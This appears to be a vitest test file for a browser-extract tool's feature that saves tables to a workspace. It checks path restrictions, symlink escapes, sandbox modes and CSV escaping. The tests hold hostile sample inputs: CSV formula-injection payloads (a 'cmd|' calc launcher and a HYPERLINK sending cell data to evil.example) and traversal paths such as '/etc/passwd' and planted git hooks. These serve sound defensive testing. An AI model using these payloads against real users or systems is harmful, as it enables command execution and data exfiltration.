import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, describe, expect, it, vi } from 'vitest'
import type { Context } from '@deepseek-ai/cordis'
import type { BridgeServer } from '../src/server.ts'
import { normalizeSavePath, saveExtract, serializeRows } from '../src/extract-save.ts'
import type { WorkspaceWriteTarget } from '../src/workspace-write.ts'
import { registerBrowserTools } from '../src/tools.ts'

const dirs: string[] = []
function tempDir(): string {
  const dir = mkdtempSync(join(tmpdir(), 'dsh-extract-'))
  dirs.push(dir)
  return dir
}

afterEach(() => {
  for (const dir of dirs.splice(0)) rmSync(dir, { recursive: true, force: true })
})

describe('extract saving', () => {
  it('accepts only workspace-relative paths and infers the format', () => {
    expect(normalizeSavePath('out/rows.json')).toEqual({ relativePath: 'out/rows.json', format: 'json' })
    expect(normalizeSavePath('rows')).toEqual({ relativePath: 'rows.csv', format: 'csv' })
    expect(normalizeSavePath('rows', 'json')).toEqual({ relativePath: 'rows.json', format: 'json' })
    expect(() => normalizeSavePath('/etc/passwd')).toThrow(/absolute/)
    expect(() => normalizeSavePath('../escape.csv')).toThrow(/"\.\."/)
    expect(() => normalizeSavePath('a/../../b.csv')).toThrow(/"\.\."/)
    expect(() => normalizeSavePath('x.csv', 'xml')).toThrow(/csv or json/)
    expect(() => normalizeSavePath('conftest.py')).toThrow(/only \.csv, \.json/)
    expect(() => normalizeSavePath('.github/workflows/ci.yml')).toThrow(/hidden/)
    expect(() => normalizeSavePath('.git/hooks/rows.csv')).toThrow(/hidden/)
    expect(() => normalizeSavePath('out/.env.csv')).toThrow(/hidden/)
    expect(() => normalizeSavePath('a/..\\b.csv')).toThrow(/"\.\."/)
    expect(() => normalizeSavePath('x.csv', 'json')).toThrow(/does not match/)
  })

  it('writes RFC 4180 CSV and neutralizes spreadsheet formulas', () => {
    const csv = serializeRows({
      columns: ['name', 'note', 'n'],
      rows: [{ name: 'Mug, large', note: 'say "hi"\nnow', n: 3 }, { name: '=HYPERLINK("x")', note: null, n: -2 }],
    }, 'csv')
    expect(csv).toBe('name,note,n\r\n"Mug, large","say ""hi""\nnow",3\r\n"\'=HYPERLINK(""x"")",,-2\r\n')
  })

  it('quotes formula-led cells unless the whole cell is a plain number (csv-poc)', () => {
    const csv = serializeRows({ columns: ['a'], rows: [
      { a: '=1+1' }, { a: "-1+cmd|' /C calc'!A0" }, { a: '-2+HYPERLINK("http://evil.example/?"&A1,"x")' },
      { a: '-5' }, { a: '-5.25' }, { a: '+1' }, { a: '@SUM(A1)' }, { a: '\tx' }, { a: -7 }, { a: '-' },
    ] }, 'csv')
    expect(csv.split('\r\n').slice(1, -1)).toEqual([
      "'=1+1",
      "'-1+cmd|' /C calc'!A0",
      '"\'-2+HYPERLINK(""http://evil.example/?""&A1,""x"")"',
      '-5',
      '-5.25',
      "'+1",
      "'@SUM(A1)",
      "'\tx",
      '-7',
      "'-",
    ])
  })

  const target = (root: string): WorkspaceWriteTarget => ({ mode: 'workspace-write', root })

  for (const portable of [false, true]) {
    describe(portable ? 'portable strategy' : 'descriptor strategy', () => {
      it('saves inside the workspace and refuses symlinked escapes', async () => {
        const workspace = tempDir()
        const outside = tempDir()
        const saved = await saveExtract(target(workspace), 'data/rows.json', { columns: ['a'], rows: [{ a: 1 }] }, undefined, portable)
        expect(saved).toMatchObject({ relativePath: 'data/rows.json', format: 'json', rowCount: 1 })
        expect(JSON.parse(readFileSync(join(workspace, 'data/rows.json'), 'utf8'))).toEqual([{ a: 1 }])
        mkdirSync(join(workspace, 'links'))
        symlinkSync(outside, join(workspace, 'links/out'))
        await expect(saveExtract(target(workspace), 'links/out/rows.csv', { columns: ['a'], rows: [] }, undefined, portable)).rejects.toThrow(/symbolic link/)
      })

      it('creates no directory outside the workspace through a symlinked parent (save3 #2)', async () => {
        const workspace = tempDir()
        const outside = tempDir()
        symlinkSync(outside, join(workspace, 'link'))
        await expect(saveExtract(target(workspace), 'link/newdir/sub/x.csv', { columns: ['a'], rows: [] }, undefined, portable)).rejects.toThrow(/symbolic link/)
        expect(existsSync(join(outside, 'newdir'))).toBe(false)
      })

      it('never overwrites an existing file or a symlink at the target (save3 #1)', async () => {
        const workspace = tempDir()
        const outside = tempDir()
        writeFileSync(join(workspace, 'rows.csv'), '# user file\n')
        await expect(saveExtract(target(workspace), 'rows.csv', { columns: ['a'], rows: [{ a: 1 }] }, undefined, portable)).rejects.toThrow(/already exists/)
        expect(readFileSync(join(workspace, 'rows.csv'), 'utf8')).toBe('# user file\n')
        const victim = join(outside, 'victim.csv')
        writeFileSync(victim, 'keep me')
        mkdirSync(join(workspace, 'exports'))
        symlinkSync(victim, join(workspace, 'exports/rows.csv'))
        await expect(saveExtract(target(workspace), 'exports/rows.csv', { columns: ['a'], rows: [{ a: 1 }] }, undefined, portable)).rejects.toThrow(/already exists/)
        expect(readFileSync(victim, 'utf8')).toBe('keep me')
      })
    })
  }
})

describe('browser_extract tool', () => {
  function harness(result: unknown, workspacePath = '', mode: string | null = 'workspace-write') {
    const registered = new Map<string, { execute: (args: unknown, exec: unknown) => Promise<unknown> }>()
    const sandboxPolicy = { resolve: vi.fn(() => ({ mode, workspaceRoot: '/ignored' })) }
    const ctx = {
      get: (name: string) => name === 'sandboxPolicy' && mode !== null ? sandboxPolicy : undefined,
      tools: {
        register: vi.fn((definition: { name: string; execute: (args: unknown, exec: unknown) => Promise<unknown> }) => {
          registered.set(definition.name, definition)
          return () => {}
        }),
      },
    } as unknown as Context
    const requestTool = vi.fn(async () => result)
    registerBrowserTools(ctx, { requestTool } as unknown as BridgeServer, {
      toolTimeoutMs: 1_000, snapshotMaxChars: 12_000, maxInteractiveItems: 60, workspacePath,
    })
    return { tool: registered.get('browser_extract')!, requestTool, sandboxPolicy }
  }
  const RESULT = { text: 'Extracted 2 row(s).', data: { columns: ['name'], rows: [{ name: 'Mug' }, { name: 'Pen' }] } }

  it('returns the extension text without saveTo', async () => {
    const { tool, requestTool } = harness(RESULT)
    const exec = { signal: new AbortController().signal }
    await expect(tool.execute({ table: '#t' }, exec)).resolves.toEqual({ text: 'Extracted 2 row(s).' })
    expect(requestTool).toHaveBeenCalledWith('browser_extract', { table: '#t' }, exec.signal, 1_000)
  })

  it('writes the rows into the calling session workspace', async () => {
    const workspace = tempDir()
    const { tool } = harness(RESULT)
    const exec = { signal: new AbortController().signal, agent: { id: 's1', session: { header: { cwd: workspace } } } }
    const result = await tool.execute({ table: '#t', saveTo: 'exports/items.csv' }, exec) as { text: string }
    expect(result.text).toMatch(/^Saved 2 row\(s\) as CSV to exports\/items\.csv \(/)
    expect(readFileSync(join(workspace, 'exports/items.csv'), 'utf8')).toBe('name\r\nMug\r\nPen\r\n')
  })

  it('falls back to the configured workspace and refuses without one', async () => {
    const workspace = tempDir()
    const exec = { signal: new AbortController().signal }
    const configured = harness(RESULT, workspace)
    await configured.tool.execute({ table: '#t', saveTo: 'a.json' }, exec)
    expect(JSON.parse(readFileSync(join(workspace, 'a.json'), 'utf8'))).toHaveLength(2)

    const none = harness(RESULT)
    await expect(none.tool.execute({ table: '#t', saveTo: 'a.json' }, exec)).rejects.toThrow(/no workspace directory/)
    expect(none.requestTool).not.toHaveBeenCalled()
    await expect(none.tool.execute({ table: '#t', saveTo: '../a.json' }, exec)).rejects.toThrow(/"\.\."/)
  })

  it('refuses in a read-only sandbox and when the sandbox cannot be determined, before touching the page', async () => {
    const workspace = tempDir()
    const exec = { signal: new AbortController().signal, agent: { id: 's1', session: { header: { cwd: workspace } } } }
    const readOnly = harness(RESULT, '', 'read-only')
    await expect(readOnly.tool.execute({ table: '#t', saveTo: 'rows.csv' }, exec)).rejects.toThrow(/read-only/)
    expect(readOnly.requestTool).not.toHaveBeenCalled()
    expect(readOnly.sandboxPolicy.resolve).toHaveBeenCalledWith({ session: exec.agent.session })
    const unknown = harness(RESULT, '', null)
    await expect(unknown.tool.execute({ table: '#t', saveTo: 'rows.csv' }, exec)).rejects.toThrow(/sandbox policy/)
    expect(unknown.requestTool).not.toHaveBeenCalled()
    expect(existsSync(join(workspace, 'rows.csv'))).toBe(false)
  })

  it('refuses executable and hidden targets the page could plant (save3)', async () => {
    const workspace = tempDir()
    const { tool, requestTool } = harness(RESULT)
    const exec = { signal: new AbortController().signal, agent: { id: 's1', session: { header: { cwd: workspace } } } }
    for (const saveTo of ['conftest.py', 'd/r1.desktop', '.github/workflows/ci.yml', '.git/hooks/pre-commit', '.envrc']) {
      await expect(tool.execute({ table: '#t', saveTo }, exec)).rejects.toThrow()
    }
    expect(requestTool).not.toHaveBeenCalled()
  })
})
